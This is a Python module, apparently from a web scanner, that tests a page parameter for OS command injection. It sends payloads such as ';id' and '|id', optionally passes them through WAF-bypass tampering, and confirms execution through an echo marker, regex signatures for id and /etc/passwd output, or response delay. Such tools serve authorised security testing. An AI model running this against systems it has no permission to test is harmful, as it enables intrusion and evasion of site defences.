import time
import re
from .tampering import apply_tampering

CMDI_SIGS = [
    r"uid=\d+\(.*\)",           
    r"gid=\d+\(.*\)",          
    r"root:x:0:0:",             
    r"\[extensions\]",          
    r"Windows IP Configuration",
    r"www-data",             
    r"apache",                
]

ECHO_MARKER = "WAFMAP_CMDI_SUCCESS"

def load_payloads():
    try:
        with open("payloads/cmdi.txt", "r") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except: 
        return [";id", "|id", f";echo {ECHO_MARKER}"]

def run_cmdi_test(engine, point, param, level, bypass, waf_name=None):
    url = point['url']
    method = point['method']
    
    defaults = point.get('defaults', {})
    original_value = defaults.get(param, "")
    
    csrf_token_data = {}
    if method == 'POST' and hasattr(engine, 'csrf_token') and isinstance(engine.csrf_token, dict):
        csrf_token_data = engine.csrf_token
    
    payloads = load_payloads()

    start = time.time()
    base_data = defaults.copy()
    if method == 'POST': 
        base_data.update(csrf_token_data)
    base_params = defaults.copy() if method == 'GET' else None
    
    engine._send_request(url, method=method, data=base_data, params=base_params)
    baseline = time.time() - start

    for pay in payloads:
        
        current_payloads = [pay]
        if original_value and original_value != 'test': 
            current_payloads.append(f"{original_value}{pay}")

        for current_pay in current_payloads:
            final_pay = apply_tampering(current_pay, 'cmdi', bypass, waf_name)
            
            if method == 'POST':
                data = defaults.copy()
                data.update(csrf_token_data)
                
                data[param] = final_pay 
                params = None
            else:
                params = defaults.copy()
                params[param] = final_pay
                data = None


            t0 = time.time()
            resp = engine._send_request(url, method=method, data=data, params=params)
            duration = time.time() - t0
            
            if resp:              
                if ECHO_MARKER in resp.text:
                    engine.add_vulnerability(
                        "CMDi (Echo)", 
                        url, 
                        final_pay, 
                        f"Serveur a renvoyé la chaîne témoin '{ECHO_MARKER}'", 
                        parameter=param
                    )
                    return 
                for sig in CMDI_SIGS:
                    if re.search(sig, resp.text, re.IGNORECASE | re.DOTALL):
                        engine.add_vulnerability(
                            "CMDi (Output)", 
                            url, 
                            final_pay, 
                            f"Commande exécutée (Regex: {sig})", 
                            parameter=param
                        )
                        return 
                if ("sleep" in pay or "timeout" in pay):
                    if duration > (baseline + 4):
                        engine.add_vulnerability(
                            "CMDi (Time-Based)", 
                            url, 
                            final_pay, 
                            f"Délai confirmé ({duration:.2f}s vs Baseline {baseline:.2f}s)", 
                            parameter=param
                        )
                        return 
